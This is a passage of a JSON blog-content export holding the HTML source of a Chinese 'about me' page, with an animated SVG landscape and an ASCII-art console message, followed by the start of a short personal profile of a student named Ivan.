C6.5552,81.1631,36.3047,64.5391,36.3047,64.5391z\"/>\n                      <path d=\"M33.0449,70.502c31.4424-19.2637,32.1875-47.1748,32.1875-47.1748s-3.8291,25.208-33.897,42.3584\n    C1.271,82.833,33.0449,70.502,33.0449,70.502z\"/>\n                      <path d=\"M13.8237,76.0244c36.5039-5.2158,48.2563-30.543,48.2563-30.543S48.5693,67.1045,14.168,70.9248\n    C-20.2324,74.749,13.8237,76.0244,13.8237,76.0244z\"/>\n                      <animatetransform attributename=\"transform\" type=\"skewX\" values=\"0;15;0\" begin=\"0s\" dur=\"5s\" fill=\"freeze\" repeatcount=\"indefinite\">\n                      <animatemotion type=\"translate\" values=\"0,0;-15,0;0,0\" begin=\"0s\" dur=\"5s\" fill=\"freeze\" repeatcount=\"indefinite\">\n                  </animatemotion></animatetransform></g>\n              </g>\n              <g id=\"sign\" transform=\"translate(700, 180)\">\n                  <polygon points=\"21.2168,1.1143 20.6665,1.5459 19.7593,1.4473 19.229,1.4209 18.9707,1.6274 18.6665,1.9004 17.6865,1.9219\n    37.3516,87.8877 40.8828,87.0791   \"/>\n                  <polygon points=\"45.4111,9.5537 2.4258,18.7158 1.563,18.498 1.4585,17.2114 0.8291,15.583 0.9165,14.3364 0.0908,12.6548\n    0.2085,12.0864 -0.1924,11.5308 -0.3296,9.271 43.3408,-0.0376 43.4766,0.5015 43.334,0.9629 43.6533,1.2046 43.8232,1.8784\n    43.8965,2.7754 44.2217,3.459 44.625,5.0576 45.041,7.5459 45.2637,7.5962 45.6191,9.0073  \"/>\n                  <polygon points=\"47.0078,20.8545 4.2368,29.5503 3.5933,28.5903 3.3965,26.9746 2.4683,24.5137 2.8398,24.1372 2.2676,23.7847\n    1.9834,22.7563 2.2417,22.3394 1.7388,21.8706 1.2627,20.1426 44.8281,11.2852 45.082,12.4014 45.0723,12.9517 45.3281,13.481\n    45.752,15.3369 46.0273,17.7524 46.4219,18.2803  \"/>\n                  <polygon points=\"47.666,31.168 4.7803,39.4023 4.251,37.4004 4.4429,36.1895 3.6465,35.1123 3.0142,32.7178 3.2754,32.1025\n    2.7461,31.7046 2.2676,29.8945 45.9268,21.5107 46.0762,22.2007 45.9512,22.8423 46.2783,23.1372 46.6777,24.9795 46.5234,25.4795\n    47.3027,27.8667 47.8086,30.2017   \"/>\n              </g>\n              <g id=\"boy_1_\">\n                  <g id=\"boy\">\n                      <path d=\"M800.7324,167.6929c0,0-7.9688-6.5039-9.7197-8.041c-1.751-1.5366-7.9331-6.5039-8.7197-13.0435\n    c-0.7861-6.5396,6.0752-15.188,17.7969-16.1885c11.7207-1.0005,12.9727,1.0366,14.1514,2.7163\n    c1.1787,1.6792,5.7178,11.1494,5.0752,18.6538c-0.6445,7.5049-5.6826,10.1133-9.7559,13.3652\n    C805.4863,168.4072,800.7324,167.6929,800.7324,167.6929z\"/>\n                      <path d=\"M810.7031,169.2109c-1.0723-1.3037-1.3574-2.9556-1.1426-4.0645c0.2139-1.1084-8.041,0.1128-8.8281,2.542\n    c1.6445,1.6787,0.751,3.146-0.5,4.1108c-1.25,0.9648-1.6797,1.502-1.9297,1.8237c0.0361,0.5361,0,0.9653,0,0.9653\n    s-1.4297,1.7153-2.2871,6.5396s-0.6787,6.79-0.9648,8.3267c-0.2852,1.5366-1.4648,5.9678-1.751,10.292s0,4.5742,0,4.5742\n    s1.251,1.7153,1.1436,4.0742s-1.2705,5.6099-1.2705,5.6099s0.2344,1.8945,1.8779,2.252c1.6445,0.3574,2.3594-0.6436,2.3594-0.6436\n    s1.0713,1.3223,1.75,4.0742c0.6797,2.752,0.6436,6.79,1.8945,7.9688c1.251,1.1797,1.6074,0.3223,1.6074,0.3223\n    s0.4648,3.3975-0.9277,6.6855c-1.3945,3.2881-4.1465,6.7568-4.1465,6.7568h11.0781c0,0,1.5723-3.5234-7.1113-2.2363\n    c3.252-4.0742,3.8955-6.1934,4.0391-11.125c1.8223,0.5,4.252,0.6738,4.9316-0.3271c0.5352,1.3223,2.4297,2.1787,3.3584,1.7139\n    c-0.2139,3.7168-1.0713,12.1846-1.0713,12.1846l9.0049,0.2852c0,0-0.751-3.2168-6.29-1.4307\n    c1.001-6.7891,1.3584-11.5068,1.3584-11.5068s1.3584,0.1074,1.8584-0.3926c0.5-0.501,0.6787-5.3252-0.4648-9.9346\n    c-1.1436-4.6104-0.5-4.4678-0.5-4.4678s1.75-0.8213,1.5-2.8584s-0.8574-3.6807-1.5352-5.5391\n    c0.4639-0.1074,1-0.7861-0.6797-2.7158c-0.2148-2.5015-0.9648-6.3242-0.6436-7.6465s0.2148-2.8232-0.1787-4.3599\n    c0-2.4302,0.7148-13.1509-1.25-17.0103c-1.9658-3.8594-2.5371-3.5737-2.5371-3.5737S812.5977,169.0142,810.7031,169.2109z\"/>\n                  </g>\n                  <g transform=\"translate(783, 122)\">\n                      <g>\n                          <path d=\"M35.3506,17.9644c2.9834-3.71,5.9824-15.2095-3.1846-18.3765c2.668,3.833,1.168,5.6665,1.168,5.6665\n    S32,1.2549,28.666-0.4121c1.5,3.1665,0,5,0,5S20.5,8.9209,24.5,13.2544S35.3506,17.9644,35.3506,17.9644z\"/>\n                          <animatetransform attributename=\"transform\" type=\"skewX\" values=\"0;30;0\" begin=\"0s\" dur=\"4s\" fill=\"freeze\" repeatcount=\"indefinite\">\n                          <animatemotion type=\"translate\" values=\"0,0;-10,0;0,0\" begin=\"0s\" dur=\"4s\" fill=\"freeze\" repeatcount=\"indefinite\">\n                      </animatemotion></animatetransform></g>\n                      <g>\n                          <path d=\"M27.125,6.2334c-1.8125-0.625-2.0625-1.9375-4.375-2.25c1,0.8125,1.125,1.6875,1.125,1.6875S21.5,4.3584,19.0625,3.9834\n    c1.3125,0.75,2,1.875,2,1.875s-3.25-0.75-5.875-0.75c1.125,0.3125,1.125,0.6875,1.125,0.6875S10.75,5.8584,8.6875,7.4834\n    c1,0.125,0.9375,0.6714,0.9375,0.6714s-4.25,1.5786-5.375,3.7661c0.875-0.4375-0.8125,1.8125-0.8125,1.8125s0.75,1.375-0.3125,1.125\n    S0.5,14.1084,0.5,12.5459c-0.5,2.1875,0.6924,2.5767,1.4375,3.3125c-0.0625,1-0.9375,2.6494-1.25,2.106s0.8594,0.4282,0.0547,2.4731\n    c-0.8047,2.0459-1.1533,3.7432-0.5103,6.5195s2.7056,4.5264,3.5181,6.2139s0.5-1.6875,0.5-1.6875L27.125,6.2334z\"/>\n                      </g>\n                  </g>\n              </g>\n          </svg>\n        </div>\n      </div>\n    </div>\n    <!-- build:js scripts/main.js -->\n    <script src=\"scripts/universe.js\"></script>\n    <script src=\"scripts/main.js\"></script>\n    <!-- endbuild -->\n    <script>\n    console.log('$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$*;  $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$;              $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n**;         $$$$$$$$$$$$$$$$!              $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n             $$$$$$$$$$$$$$;              $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n              ;$$$$$$$$$$$$              $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n                $$$$$$$$$*              $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n$                ;$$$$$$*             ;$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n$$*                $$$$$              $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$;               !$$              $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$                             ;$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$o                          ;$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$                        ;$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$                     ;$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$!   o$$$$\\n$$$$$$$$$$$$;                  *$$$$$$$$$$$$$$$$o                       ;$$$$\\n$$$$$$$$$$$$$$                $$$$$$$                                    $$$$\\n$$$$$$$$$$$$$$$$              $$$$$$$                                    $$$$\\n$$$$$$$$$$$$$$$$              $$$$$$$                                    $$$$\\n$$$$$$$$$$$$$$$$              ;$$$$$$!                              ;o$$$$$$$\\n$$$$$$$$$$$$$$$$               $$$$$$$              $$$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$*              $$$$$$$              o$$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$              $$$$$$$               $$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$              $$$$$$$               $$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$              ;$$$$$$$                                $$$$$$\\n$$$$$$$$$$$$$$$$$              ;$$$$$$$                                $$$$$$\\n$$$$$$$$$$$$$$$$$!            ;;$$$$$$$                                ;$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                                 $$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                          ;!$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$!              $$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$              $$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$              *$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$              ;$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$               $$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$               $$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$              $$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$              $$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$               $$$$$$$$$$$$$$$$$$$$$');\n    </script>\n  </body>\n</html>\n","excerpt":"","more":"<!doctype html>\n<html lang=\"\">\n  <head>\n    <meta charset=\"utf-8\">\n    <meta name=\"description\" content=\"\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no\" />\n    <title>关于我</title>\n\n    <!-- build:css styles/main.css -->\n    <link rel=\"stylesheet\" href=\"styles/main.css\">\n    <!-- endbuild -->\n\n  </head>\n  <body>\n    <div class=\"container\">\n      <div class=\"content\">\n        <canvas id=\"universe\"></canvas>\n        <canvas id=\"canvas\"></canvas>\n        <div id=\"footer\" class=\"\">\n          <svg id=\"scene\" x=\"0px\" y=\"0px\" width=\"1600px\" height=\"315px\">\n              <path id=\"ground\" d=\"M0,316.4209c0,0,157.7119-35.416,469-56c7.3833-0.4883,23.7876-3.5488,31.3335-4.0166\n            c3.7681-0.2334,19.4302,0.9424,28.3335,0.3506c17.1494-1.1396,30.9072-4.2734,38.333-4.6836\n            c7.5972-0.4189,18.4058,0.3799,27.6665-0.9834c5.7075-0.8408,10.1318-4.042,14.9248-4.2705\n            c7.8369-0.373,24.5693,3.6084,34.4087,4.2705c11.0586,0.7432,15.2656-1.8135,24.3335-2.1523c10.0576-0.376,20.4629,1.3867,28.6665,0\n            c3.5957-0.6074,4.4194,0.4209,7.7227-0.7715c1.4927-0.5391,5.8179-3.5693,6.9438-4.2432c3.8335,0.667,6.1426-1.0732,9.917-1.167\n            c2.2739-0.0566,3.9673-0.9072,6.249-0.9609c2.2725-0.0537,5.5547-1.2383,7.8345-1.2881c2.25-0.0498,3.498,1.0352,5.7554,0.9883\n            c2.9648-0.0615,7.9341,0.3164,10.9111,0.2607c2.2461-0.042,2.4976-0.5195,4.7505-0.5586c2.9663-0.0518,2.1045-0.5615,5.0825-0.6074\n            c1.5811-0.0244,6.9976,0.4131,8.582,0.3896c0.8887-0.0127,2.6113,0.373,3.5015,0.3604c1.5527-0.0215,2.2739-0.4404,3.8296-0.4609\n            c1.416-0.0186,2.0854-0.8555,3.5039-0.873c1.0835-0.0127,2.9155,0.7939,4.0005,0.7813c1.1104-0.0127,3.5542,0.4805,4.666,0.4688\n            c1.3047-0.0137,1.2773-0.5332,2.584-0.5459c1.415-0.0137,1.165-0.4414,2.5825-0.4541c0.916-0.0078,3.499,0.3984,4.416,0.3906\n            c1.499-0.0127,1.833,0.6221,3.3345,0.6104c1.3296-0.0098,3.8267-0.666,5.1587-0.6748c1.3335-0.0088,2.8389-0.6514,4.1743-0.6592\n            c1.3335-0.0078,2.4971,0.6191,3.8325,0.6123c2.5518-0.0127,7.3579,0.3965,9.9175,0.3877c5.3169-0.0176,5.5796-0.4063,10.9297-0.4063\n            c1.8379,0,6.7031,1.3184,8.3203,1.2402c2.1055-0.1016,3.7139-1.6572,5.5283-1.7969c3.9541-0.3037,7.3262-0.5732,10.5986-0.2598\n            c6.248,0.5977,12.1973-0.8125,21.207-0.7539c1.7266,0.0107,15.7813,3.085,17.5,3.0977c3.4014,0.0254,6.6191-1.3398,9.9971-1.3066\n            c4.1221,0.041,8.2275,1.2529,12.3369,1.3066c2.0752,0.0273,4.1543-1.1084,6.2314-1.0771c3.3662,0.0498,4.5547,1.0166,7.9346,1.0771\n            c2.1104,0.0381,6.4063-0.834,8.5264-0.792c2.7021,0.0537,4.4766-1.6729,7.2002-1.6113c2.9277,0.0654,7.6465,3.1641,10.6074,3.2393\n            c4.8359,0.123,8.8809-0.9854,13.832-0.8359c2.5029,0.0752,11.8818,2.0498,14.375,2.1289c1.8398,0.0586,2.499-1.2188,4.334-1.1582\n            c2.1689,0.0713,4.5049,1.209,6.666,1.2832c2.6699,0.0908,4.3398-0.916,6.998-0.8203c3.3379,0.1201,6.0566,1.3193,9.377,1.4453\n            c4.001,0.1514,4.7764-1.1602,8.75-1c3.1836,0.1289,16.834,1.9912,20,2.125c4.0059,0.1699,4.0029-0.9004,7.9814-0.7227\n            c6.8594,0.3076,7.9102,1.7656,14.6855,2.0977c8.916,0.4365,23.5254-0.2432,32.293,0.2344\n            c6.7168,0.3662,13.3896,0.7432,20.0186,1.1318C1458.8545,268.4941,1680,316.4209,1680,316.4209H0z\" />\n              <path id=\"stone1\" d=\"M680.3335,250.7549c7.3335,0.333,13.6665-1.2549,6-6.4609s-14.333-7.1221-18.6665,0.8359\n            S680.3335,250.7549,680.3335,250.7549z\" />\n              <path id=\"stone2\" d=\"M750.5,243.1709c3.25,0,2.5-3.707-1.75-4.2285s-5,3.7285-3,4.2285S750.5,243.1709,750.5,243.1709z\" />\n              <path id=\"stone3\" d=\"M988.4893,243.8242c2.8857,0.3467,4.8438,1.2627,3.0107-2.0703s-7.3955,1.3555-5.2031,1.7129\n            S988.4893,243.8242,988.4893,243.8242z\" />\n              <path id=\"stone4\" d=\"M697,248.9355c2.0142-0.2021,2.1665-2.0156,1-2.1816s-9.1543,1.8398-5.9937,2.6699S697,248.9355,697,248.9355z\" />\n              <g id=\"greens\" transform=\"translate(850, 180)\">\n                  <g>\n                      <path d=\"M36.3877,59.4268C33.0576,18.9482,6.4658,4.522,6.4658,4.522s22.4834,16.1426,24.4414,54.2251\n    C32.8657,96.8311,36.3877,59.4268,36.3877,59.4268z\" />\n                      <path d=\"M41.8496,83.1641C31.1572,43.98,2.3711,34.6738,2.3711,34.6738s25.063,11.7471,33.9668,48.8271\n    C45.2441,120.5791,41.8496,83.1641,41.8496,83.1641z\" />\n                      <path d=\"M31.3955,60.7207C23.7139,25.7979,2.5381,16.9541,2.5381,16.9541s18.4165,10.9277,24.7925,43.9502\n    C33.7061,93.9258,31.3955,60.7207,31.3955,60.7207z\" />\n                      <path d=\"M40.4517,62.0068C47.9473,21.6187,25.4009,0.1914,25.4009,0.1914s18.0098,21.9634,9.7896,59.6357\n    C26.9722,97.499,40.4517,62.0068,40.4517,62.0068z\" />\n                      <path d=\"M41.9414,69.4316c13.0313-38.9565-6.3218-63.3062-6.3218-63.3062s14.7856,24.251,1.4141,60.4185\n    C23.6621,102.709,41.9414,69.4316,41.9414,69.4316z\" />\n                      <path d=\"M29.4976,87.9092c27.4097-30.5938,19.2993-60.6226,19.2993-60.6226s3.958,28.1255-22.6606,56.0249\n    C-0.4775,111.2109,29.4976,87.9092,29.4976,87.9092z\" />\n                      <animateTransform attributeName=\"transform\" type=\"skewX\" values=\"0;10;0\" begin=\"0s\" dur=\"5.5s\" fill=\"freeze\" repeatCount=\"indefinite\" />\n                      <animateMotion type=\"translate\" values=\"0,0;-10,0;0,0\" begin=\"0s\" dur=\"5.5s\" fill=\"freeze\" repeatCount=\"indefinite\" />\n                  </g>\n                  <g>\n                      <path d=\"M34.9995,60.4189C56.0713,30.6665,46.1133,5.4014,46.1133,5.4014S52.2559,29.4746,31.6235,56.79\n    C10.9917,84.1035,34.9995,60.4189,34.9995,60.4189z\" />\n                      <path d=\"M36.3047,64.5391c28.4629-23.4443,25.3262-51.189,25.3262-51.189s-0.293,25.4971-27.6851,46.6538\n    C6.5552,81.1631,36.3047,64.5391,36.3047,64.5391z\" />\n                      <path d=\"M33.0449,70.502c31.4424-19.2637,32.1875-47.1748,32.1875-47.1748s-3.8291,25.208-33.897,42.3584\n    C1.271,82.833,33.0449,70.502,33.0449,70.502z\" />\n                      <path d=\"M13.8237,76.0244c36.5039-5.2158,48.2563-30.543,48.2563-30.543S48.5693,67.1045,14.168,70.9248\n    C-20.2324,74.749,13.8237,76.0244,13.8237,76.0244z\" />\n                      <animateTransform attributeName=\"transform\" type=\"skewX\" values=\"0;15;0\" begin=\"0s\" dur=\"5s\" fill=\"freeze\" repeatCount=\"indefinite\" />\n                      <animateMotion type=\"translate\" values=\"0,0;-15,0;0,0\" begin=\"0s\" dur=\"5s\" fill=\"freeze\" repeatCount=\"indefinite\" />\n                  </g>\n              </g>\n              <g id=\"sign\" transform=\"translate(700, 180)\">\n                  <polygon points=\"21.2168,1.1143 20.6665,1.5459 19.7593,1.4473 19.229,1.4209 18.9707,1.6274 18.6665,1.9004 17.6865,1.9219\n    37.3516,87.8877 40.8828,87.0791   \" />\n                  <polygon points=\"45.4111,9.5537 2.4258,18.7158 1.563,18.498 1.4585,17.2114 0.8291,15.583 0.9165,14.3364 0.0908,12.6548\n    0.2085,12.0864 -0.1924,11.5308 -0.3296,9.271 43.3408,-0.0376 43.4766,0.5015 43.334,0.9629 43.6533,1.2046 43.8232,1.8784\n    43.8965,2.7754 44.2217,3.459 44.625,5.0576 45.041,7.5459 45.2637,7.5962 45.6191,9.0073  \" />\n                  <polygon points=\"47.0078,20.8545 4.2368,29.5503 3.5933,28.5903 3.3965,26.9746 2.4683,24.5137 2.8398,24.1372 2.2676,23.7847\n    1.9834,22.7563 2.2417,22.3394 1.7388,21.8706 1.2627,20.1426 44.8281,11.2852 45.082,12.4014 45.0723,12.9517 45.3281,13.481\n    45.752,15.3369 46.0273,17.7524 46.4219,18.2803  \" />\n                  <polygon points=\"47.666,31.168 4.7803,39.4023 4.251,37.4004 4.4429,36.1895 3.6465,35.1123 3.0142,32.7178 3.2754,32.1025\n    2.7461,31.7046 2.2676,29.8945 45.9268,21.5107 46.0762,22.2007 45.9512,22.8423 46.2783,23.1372 46.6777,24.9795 46.5234,25.4795\n    47.3027,27.8667 47.8086,30.2017   \" />\n              </g>\n              <g id=\"boy_1_\">\n                  <g id=\"boy\">\n                      <path d=\"M800.7324,167.6929c0,0-7.9688-6.5039-9.7197-8.041c-1.751-1.5366-7.9331-6.5039-8.7197-13.0435\n    c-0.7861-6.5396,6.0752-15.188,17.7969-16.1885c11.7207-1.0005,12.9727,1.0366,14.1514,2.7163\n    c1.1787,1.6792,5.7178,11.1494,5.0752,18.6538c-0.6445,7.5049-5.6826,10.1133-9.7559,13.3652\n    C805.4863,168.4072,800.7324,167.6929,800.7324,167.6929z\" />\n                      <path d=\"M810.7031,169.2109c-1.0723-1.3037-1.3574-2.9556-1.1426-4.0645c0.2139-1.1084-8.041,0.1128-8.8281,2.542\n    c1.6445,1.6787,0.751,3.146-0.5,4.1108c-1.25,0.9648-1.6797,1.502-1.9297,1.8237c0.0361,0.5361,0,0.9653,0,0.9653\n    s-1.4297,1.7153-2.2871,6.5396s-0.6787,6.79-0.9648,8.3267c-0.2852,1.5366-1.4648,5.9678-1.751,10.292s0,4.5742,0,4.5742\n    s1.251,1.7153,1.1436,4.0742s-1.2705,5.6099-1.2705,5.6099s0.2344,1.8945,1.8779,2.252c1.6445,0.3574,2.3594-0.6436,2.3594-0.6436\n    s1.0713,1.3223,1.75,4.0742c0.6797,2.752,0.6436,6.79,1.8945,7.9688c1.251,1.1797,1.6074,0.3223,1.6074,0.3223\n    s0.4648,3.3975-0.9277,6.6855c-1.3945,3.2881-4.1465,6.7568-4.1465,6.7568h11.0781c0,0,1.5723-3.5234-7.1113-2.2363\n    c3.252-4.0742,3.8955-6.1934,4.0391-11.125c1.8223,0.5,4.252,0.6738,4.9316-0.3271c0.5352,1.3223,2.4297,2.1787,3.3584,1.7139\n    c-0.2139,3.7168-1.0713,12.1846-1.0713,12.1846l9.0049,0.2852c0,0-0.751-3.2168-6.29-1.4307\n    c1.001-6.7891,1.3584-11.5068,1.3584-11.5068s1.3584,0.1074,1.8584-0.3926c0.5-0.501,0.6787-5.3252-0.4648-9.9346\n    c-1.1436-4.6104-0.5-4.4678-0.5-4.4678s1.75-0.8213,1.5-2.8584s-0.8574-3.6807-1.5352-5.5391\n    c0.4639-0.1074,1-0.7861-0.6797-2.7158c-0.2148-2.5015-0.9648-6.3242-0.6436-7.6465s0.2148-2.8232-0.1787-4.3599\n    c0-2.4302,0.7148-13.1509-1.25-17.0103c-1.9658-3.8594-2.5371-3.5737-2.5371-3.5737S812.5977,169.0142,810.7031,169.2109z\" />\n                  </g>\n                  <g transform=\"translate(783, 122)\">\n                      <g>\n                          <path d=\"M35.3506,17.9644c2.9834-3.71,5.9824-15.2095-3.1846-18.3765c2.668,3.833,1.168,5.6665,1.168,5.6665\n    S32,1.2549,28.666-0.4121c1.5,3.1665,0,5,0,5S20.5,8.9209,24.5,13.2544S35.3506,17.9644,35.3506,17.9644z\" />\n                          <animateTransform attributeName=\"transform\" type=\"skewX\" values=\"0;30;0\" begin=\"0s\" dur=\"4s\" fill=\"freeze\" repeatCount=\"indefinite\" />\n                          <animateMotion type=\"translate\" values=\"0,0;-10,0;0,0\" begin=\"0s\" dur=\"4s\" fill=\"freeze\" repeatCount=\"indefinite\" />\n                      </g>\n                      <g>\n                          <path d=\"M27.125,6.2334c-1.8125-0.625-2.0625-1.9375-4.375-2.25c1,0.8125,1.125,1.6875,1.125,1.6875S21.5,4.3584,19.0625,3.9834\n    c1.3125,0.75,2,1.875,2,1.875s-3.25-0.75-5.875-0.75c1.125,0.3125,1.125,0.6875,1.125,0.6875S10.75,5.8584,8.6875,7.4834\n    c1,0.125,0.9375,0.6714,0.9375,0.6714s-4.25,1.5786-5.375,3.7661c0.875-0.4375-0.8125,1.8125-0.8125,1.8125s0.75,1.375-0.3125,1.125\n    S0.5,14.1084,0.5,12.5459c-0.5,2.1875,0.6924,2.5767,1.4375,3.3125c-0.0625,1-0.9375,2.6494-1.25,2.106s0.8594,0.4282,0.0547,2.4731\n    c-0.8047,2.0459-1.1533,3.7432-0.5103,6.5195s2.7056,4.5264,3.5181,6.2139s0.5-1.6875,0.5-1.6875L27.125,6.2334z\" />\n                      </g>\n                  </g>\n              </g>\n          </svg>\n        </div>\n      </div>\n    </div>\n    <!-- build:js scripts/main.js -->\n    <script src=\"scripts/universe.js\"></script>\n    <script src=\"scripts/main.js\"></script>\n    <!-- endbuild -->\n    <script>\n    console.log('$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$*;  $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$;              $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n**;         $$$$$$$$$$$$$$$$!              $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n             $$$$$$$$$$$$$$;              $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n              ;$$$$$$$$$$$$              $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n                $$$$$$$$$*              $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n$                ;$$$$$$*             ;$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n$$*                $$$$$              $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$;               !$$              $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$                             ;$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$o                          ;$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$                        ;$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$                     ;$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$!   o$$$$\\n$$$$$$$$$$$$;                  *$$$$$$$$$$$$$$$$o                       ;$$$$\\n$$$$$$$$$$$$$$                $$$$$$$                                    $$$$\\n$$$$$$$$$$$$$$$$              $$$$$$$                                    $$$$\\n$$$$$$$$$$$$$$$$              $$$$$$$                                    $$$$\\n$$$$$$$$$$$$$$$$              ;$$$$$$!                              ;o$$$$$$$\\n$$$$$$$$$$$$$$$$               $$$$$$$              $$$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$*              $$$$$$$              o$$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$              $$$$$$$               $$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$              $$$$$$$               $$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$              ;$$$$$$$                                $$$$$$\\n$$$$$$$$$$$$$$$$$              ;$$$$$$$                                $$$$$$\\n$$$$$$$$$$$$$$$$$!            ;;$$$$$$$                                ;$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                                 $$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                          ;!$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$!              $$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$              $$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$              *$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$              ;$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$               $$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$               $$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$              $$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$              $$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$               $$$$$$$$$$$$$$$$$$$$$');\n    </script>\n  </body>\n</html>\n"},{"title":"关于","id":10,"date":"2016-09-25T23:27:35.000Z","header-img":"content/images/f2e/about-me.jpg","_content":"# 关于我\n\n** 一凡，Ivan **\n\n本科 自动化 研究生 计算机科学技术\n\n人在 英国 来自 北京\n\nUniversity of Birmingham\n\n* 自幼喜爱计算机技术 极客 爱钻研 爱学习\n* 爱好Web前端 (React粉丝)\n* 爱好渗透测试\n* 和前端相关的美工，但渣\n* 从来不用收藏夹，一直背网址\n* 空格档\n* Github的star各种人的狂魔\n* Cnbeta党\n* Mac党，中度果粉\n* 